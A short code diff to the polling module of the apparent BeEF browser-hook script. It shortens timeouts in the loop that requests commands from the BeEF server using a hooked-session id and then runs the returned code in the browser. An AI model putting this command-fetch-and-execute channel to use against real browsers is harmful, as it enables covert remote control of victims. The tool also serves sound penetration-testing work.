@@ -23,7 +23,7 @@ beef.updater = {
 	// Low timeouts combined with the way the framework sends commamd modules result 
 	// in instructions being sent repeatedly or complex code. 
 	// If you suffer from ADHD, you can decrease this setting.
-	timeout: 10000,
+	timeout: 1000,
 	
 	// A lock.
 	lock: false,
@@ -62,7 +62,7 @@ beef.updater = {
 	get_commands: function(http_response) {
 		try {
 			this.lock = true;
-            beef.net.request('http', 'GET', beef.net.host, beef.net.port, beef.net.hook, null, 'BEEFHOOK='+beef.session.get_hook_session_id(), 10, 'script', function(response) {
+            beef.net.request('http', 'GET', beef.net.host, beef.net.port, beef.net.hook, null, 'BEEFHOOK='+beef.session.get_hook_session_id(), 1, 'script', function(response) {
                 if (response.body != null && response.body.length > 0)
                     beef.updater.execute_commands();
             });
